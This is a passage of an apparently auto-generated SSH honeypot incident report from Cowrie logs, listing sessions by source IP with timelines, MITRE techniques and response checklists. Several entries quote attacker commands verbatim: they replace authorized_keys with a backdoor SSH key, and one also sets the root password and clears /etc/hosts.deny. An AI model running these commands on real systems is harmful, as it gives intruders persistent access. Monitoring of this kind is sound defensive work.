- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eee3d72fecac

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-04-12 05:56 |
| **Last Seen** | 2026-04-12 05:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 05:56:56` | `cowrie.session.connect` |
| `2026-04-12 05:56:56` | `cowrie.client.version` |
| `2026-04-12 05:56:56` | `cowrie.client.kex` |
| `2026-04-12 05:56:57` | `cowrie.login.success` |
| `2026-04-12 05:56:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4153c7abf5a6

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-04-12 05:57 |
| **Last Seen** | 2026-04-12 05:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 05:57:31` | `cowrie.session.connect` |
| `2026-04-12 05:57:31` | `cowrie.client.version` |
| `2026-04-12 05:57:31` | `cowrie.client.kex` |
| `2026-04-12 05:57:32` | `cowrie.login.success` |
| `2026-04-12 05:57:32` | `cowrie.session.params` |
| `2026-04-12 05:57:32` | `cowrie.command.input` |
| `2026-04-12 05:57:32` | `cowrie.command.failed` |
| `2026-04-12 05:57:33` | `cowrie.log.closed` |
| `2026-04-12 05:57:33` | `cowrie.session.params` |
| `2026-04-12 05:57:33` | `cowrie.command.input` |
| `2026-04-12 05:57:33` | `cowrie.session.file_download` |
| `2026-04-12 05:57:33` | `cowrie.log.closed` |
| `2026-04-12 05:57:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-505a94b0260a

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-04-12 05:57 |
| **Last Seen** | 2026-04-12 05:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 05:57:36` | `cowrie.session.connect` |
| `2026-04-12 05:57:36` | `cowrie.client.version` |
| `2026-04-12 05:57:36` | `cowrie.client.kex` |
| `2026-04-12 05:57:37` | `cowrie.login.success` |
| `2026-04-12 05:57:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a0979fb212e

| Field | Detail |
|---|---|
| **Source IP** | `79.45.101[.]239` |
| **First Seen** | 2026-04-12 05:57 |
| **Last Seen** | 2026-04-12 05:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 05:57:43` | `cowrie.session.connect` |
| `2026-04-12 05:57:43` | `cowrie.client.version` |
| `2026-04-12 05:57:43` | `cowrie.client.kex` |
| `2026-04-12 05:57:43` | `cowrie.login.success` |
| `2026-04-12 05:57:44` | `cowrie.session.params` |
| `2026-04-12 05:57:44` | `cowrie.command.input` |
| `2026-04-12 05:57:44` | `cowrie.command.failed` |
| `2026-04-12 05:57:44` | `cowrie.log.closed` |
| `2026-04-12 05:57:44` | `cowrie.session.params` |
| `2026-04-12 05:57:44` | `cowrie.command.input` |
| `2026-04-12 05:57:44` | `cowrie.session.file_download` |
| `2026-04-12 05:57:44` | `cowrie.log.closed` |
| `2026-04-12 05:57:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.45.101[.]239` to AbuseIPDB if not already reported
- [ ] Block `79.45.101[.]239` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3460b9e99ee

| Field | Detail |
|---|---|
| **Source IP** | `79.45.101[.]239` |
| **First Seen** | 2026-04-12 05:57 |
| **Last Seen** | 2026-04-12 05:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 05:57:46` | `cowrie.session.connect` |
| `2026-04-12 05:57:46` | `cowrie.client.version` |
| `2026-04-12 05:57:46` | `cowrie.client.kex` |
| `2026-04-12 05:57:47` | `cowrie.login.success` |
| `2026-04-12 05:57:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.45.101[.]239` to AbuseIPDB if not already reported
- [ ] Block `79.45.101[.]239` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b048b72bcbc

| Field | Detail |
|---|---|
| **Source IP** | `102.210.148[.]92` |
| **First Seen** | 2026-04-12 05:59 |
| **Last Seen** | 2026-04-12 05:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 05:59:16` | `cowrie.session.connect` |
| `2026-04-12 05:59:16` | `cowrie.client.version` |
| `2026-04-12 05:59:17` | `cowrie.client.kex` |
| `2026-04-12 05:59:17` | `cowrie.login.success` |
| `2026-04-12 05:59:18` | `cowrie.session.params` |
| `2026-04-12 05:59:18` | `cowrie.command.input` |
| `2026-04-12 05:59:18` | `cowrie.command.failed` |
| `2026-04-12 05:59:18` | `cowrie.log.closed` |
| `2026-04-12 05:59:18` | `cowrie.session.params` |
| `2026-04-12 05:59:18` | `cowrie.command.input` |
| `2026-04-12 05:59:18` | `cowrie.session.file_download` |
| `2026-04-12 05:59:18` | `cowrie.log.closed` |
| `2026-04-12 05:59:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.148[.]92` to AbuseIPDB if not already reported
- [ ] Block `102.210.148[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53c62b154be1

| Field | Detail |
|---|---|
| **Source IP** | `102.210.148[.]92` |
| **First Seen** | 2026-04-12 05:59 |
| **Last Seen** | 2026-04-12 05:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 05:59:21` | `cowrie.session.connect` |
| `2026-04-12 05:59:21` | `cowrie.client.version` |
| `2026-04-12 05:59:21` | `cowrie.client.kex` |
| `2026-04-12 05:59:22` | `cowrie.login.success` |
| `2026-04-12 05:59:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.148[.]92` to AbuseIPDB if not already reported
- [ ] Block `102.210.148[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f388a0b684d4

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-04-12 05:59 |
| **Last Seen** | 2026-04-12 05:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 05:59:25` | `cowrie.session.connect` |
| `2026-04-12 05:59:25` | `cowrie.client.version` |
| `2026-04-12 05:59:25` | `cowrie.client.kex` |
| `2026-04-12 05:59:26` | `cowrie.login.success` |
| `2026-04-12 05:59:27` | `cowrie.session.params` |
| `2026-04-12 05:59:27` | `cowrie.command.input` |
| `2026-04-12 05:59:27` | `cowrie.command.failed` |
| `2026-04-12 05:59:27` | `cowrie.log.closed` |
| `2026-04-12 05:59:27` | `cowrie.session.params` |
| `2026-04-12 05:59:27` | `cowrie.command.input` |
| `2026-04-12 05:59:27` | `cowrie.session.file_download` |
| `2026-04-12 05:59:27` | `cowrie.log.closed` |
| `2026-04-12 05:59:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9df4ebcfa3b1

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-04-12 05:59 |
| **Last Seen** | 2026-04-12 05:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 05:59:30` | `cowrie.session.connect` |
| `2026-04-12 05:59:30` | `cowrie.client.version` |
| `2026-04-12 05:59:30` | `cowrie.client.kex` |
| `2026-04-12 05:59:31` | `cowrie.login.success` |
| `2026-04-12 05:59:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9c1be0b9e20

| Field | Detail |
|---|---|
| **Source IP** | `101.126.11[.]137` |
| **First Seen** | 2026-04-12 05:59 |
| **Last Seen** | 2026-04-12 05:59 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:wcZmlhDrXPnJ"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 05:59:33` | `cowrie.session.connect` |
| `2026-04-12 05:59:33` | `cowrie.client.version` |
| `2026-04-12 05:59:33` | `cowrie.client.kex` |
| `2026-04-12 05:59:33` | `cowrie.login.success` |
| `2026-04-12 05:59:35` | `cowrie.session.params` |
| `2026-04-12 05:59:35` | `cowrie.command.input` |
| `2026-04-12 05:59:35` | `cowrie.command.failed` |
| `2026-04-12 05:59:35` | `cowrie.log.closed` |
| `2026-04-12 05:59:36` | `cowrie.session.params` |
| `2026-04-12 05:59:36` | `cowrie.command.input` |
| `2026-04-12 05:59:37` | `cowrie.session.file_download` |
| `2026-04-12 05:59:37` | `cowrie.log.closed` |
| `2026-04-12 05:59:48` | `cowrie.session.params` |
| `2026-04-12 05:59:48` | `cowrie.command.input` |
| `2026-04-12 05:59:48` | `cowrie.log.closed` |
| `2026-04-12 05:59:49` | `cowrie.session.params` |
| `2026-04-12 05:59:49` | `cowrie.command.input` |
| `2026-04-12 05:59:49` | `cowrie.log.closed` |
| `2026-04-12 05:59:49` | `cowrie.session.params` |
| `2026-04-12 05:59:49` | `cowrie.command.input` |
| `2026-04-12 05:59:49` | `cowrie.session.file_download` |
| `2026-04-12 05:59:49` | `cowrie.log.closed` |
| `2026-04-12 05:59:50` | `cowrie.session.params` |
| `2026-04-12 05:59:50` | `cowrie.command.input` |
| `2026-04-12 05:59:50` | `cowrie.log.closed` |
| `2026-04-12 05:59:50` | `cowrie.session.params` |
| `2026-04-12 05:59:50` | `cowrie.command.input` |
| `2026-04-12 05:59:50` | `cowrie.log.closed` |
| `2026-04-12 05:59:51` | `cowrie.session.params` |
| `2026-04-12 05:59:51` | `cowrie.command.input` |
| `2026-04-12 05:59:51` | `cowrie.command.input` |
| `2026-04-12 05:59:51` | `cowrie.log.closed` |
| `2026-04-12 05:59:51` | `cowrie.session.params` |
| `2026-04-12 05:59:51` | `cowrie.command.input` |
| `2026-04-12 05:59:51` | `cowrie.log.closed` |
| `2026-04-12 05:59:52` | `cowrie.session.params` |
| `2026-04-12 05:59:52` | `cowrie.command.input` |
| `2026-04-12 05:59:52` | `cowrie.log.closed` |
| `2026-04-12 05:59:52` | `cowrie.session.params` |
| `2026-04-12 05:59:52` | `cowrie.command.input` |
| `2026-04-12 05:59:53` | `cowrie.log.closed` |
| `2026-04-12 05:59:53` | `cowrie.session.params` |
| `2026-04-12 05:59:53` | `cowrie.command.input` |
| `2026-04-12 05:59:53` | `cowrie.log.closed` |
| `2026-04-12 05:59:54` | `cowrie.session.params` |
| `2026-04-12 05:59:54` | `cowrie.command.input` |
| `2026-04-12 05:59:54` | `cowrie.log.closed` |
| `2026-04-12 05:59:54` | `cowrie.session.params` |
| `2026-04-12 05:59:54` | `cowrie.command.input` |
| `2026-04-12 05:59:55` | `cowrie.log.closed` |
| `2026-04-12 05:59:55` | `cowrie.session.params` |
| `2026-04-12 05:59:55` | `cowrie.command.input` |
| `2026-04-12 05:59:55` | `cowrie.log.closed` |
| `2026-04-12 05:59:56` | `cowrie.session.params` |
| `2026-04-12 05:59:56` | `cowrie.command.input` |
| `2026-04-12 05:59:56` | `cowrie.log.closed` |
| `2026-04-12 05:59:56` | `cowrie.session.params` |
| `2026-04-12 05:59:56` | `cowrie.command.input` |
| `2026-04-12 05:59:57` | `cowrie.log.closed` |
| `2026-04-12 05:59:57` | `cowrie.session.params` |
| `2026-04-12 05:59:57` | `cowrie.command.input` |
| `2026-04-12 05:59:57` | `cowrie.log.closed` |
| `2026-04-12 05:59:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.11[.]137` to AbuseIPDB if not already reported
- [ ] Block `101.126.11[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cadfa09b60ef

| Field | Detail |
|---|---|
| **Source IP** | `79.45.101[.]239` |
| **First Seen** | 2026-04-12 06:00 |
| **Last Seen** | 2026-04-12 06:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:00:39` | `cowrie.session.connect` |
| `2026-04-12 06:00:39` | `cowrie.client.version` |
| `2026-04-12 06:00:39` | `cowrie.client.kex` |
| `2026-04-12 06:00:39` | `cowrie.login.success` |
| `2026-04-12 06:00:39` | `cowrie.session.params` |
| `2026-04-12 06:00:39` | `cowrie.command.input` |
| `2026-04-12 06:00:39` | `cowrie.command.failed` |
| `2026-04-12 06:00:40` | `cowrie.log.closed` |
| `2026-04-12 06:00:40` | `cowrie.session.params` |
| `2026-04-12 06:00:40` | `cowrie.command.input` |
| `2026-04-12 06:00:40` | `cowrie.session.file_download` |
| `2026-04-12 06:00:40` | `cowrie.log.closed` |
| `2026-04-12 06:00:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.45.101[.]239` to AbuseIPDB if not already reported
- [ ] Block `79.45.101[.]239` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a0be56bc007

| Field | Detail |
|---|---|
| **Source IP** | `79.45.101[.]239` |
| **First Seen** | 2026-04-12 06:00 |
| **Last Seen** | 2026-04-12 06:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:00:42` | `cowrie.session.connect` |
| `2026-04-12 06:00:42` | `cowrie.client.version` |
| `2026-04-12 06:00:42` | `cowrie.client.kex` |
| `2026-04-12 06:00:43` | `cowrie.login.success` |
| `2026-04-12 06:00:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.45.101[.]239` to AbuseIPDB if not already reported
- [ ] Block `79.45.101[.]239` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1252e03579d

| Field | Detail |
|---|---|
| **Source IP** | `102.210.148[.]92` |
| **First Seen** | 2026-04-12 06:01 |
| **Last Seen** | 2026-04-12 06:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:01:03` | `cowrie.session.connect` |
| `2026-04-12 06:01:03` | `cowrie.client.version` |
| `2026-04-12 06:01:03` | `cowrie.client.kex` |
| `2026-04-12 06:01:04` | `cowrie.login.success` |
| `2026-04-12 06:01:04` | `cowrie.session.params` |
| `2026-04-12 06:01:04` | `cowrie.command.input` |
| `2026-04-12 06:01:04` | `cowrie.command.failed` |
| `2026-04-12 06:01:04` | `cowrie.log.closed` |
| `2026-04-12 06:01:05` | `cowrie.session.params` |
| `2026-04-12 06:01:05` | `cowrie.command.input` |
| `2026-04-12 06:01:05` | `cowrie.session.file_download` |
| `2026-04-12 06:01:05` | `cowrie.log.closed` |
| `2026-04-12 06:01:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.148[.]92` to AbuseIPDB if not already reported
- [ ] Block `102.210.148[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a084782cecf

| Field | Detail |
|---|---|
| **Source IP** | `102.210.148[.]92` |
| **First Seen** | 2026-04-12 06:01 |
| **Last Seen** | 2026-04-12 06:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:01:07` | `cowrie.session.connect` |
| `2026-04-12 06:01:07` | `cowrie.client.version` |
| `2026-04-12 06:01:08` | `cowrie.client.kex` |
| `2026-04-12 06:01:08` | `cowrie.login.success` |
| `2026-04-12 06:01:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.148[.]92` to AbuseIPDB if not already reported
- [ ] Block `102.210.148[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d73127ec206

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-04-12 06:02 |
| **Last Seen** | 2026-04-12 06:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:02:06` | `cowrie.session.connect` |
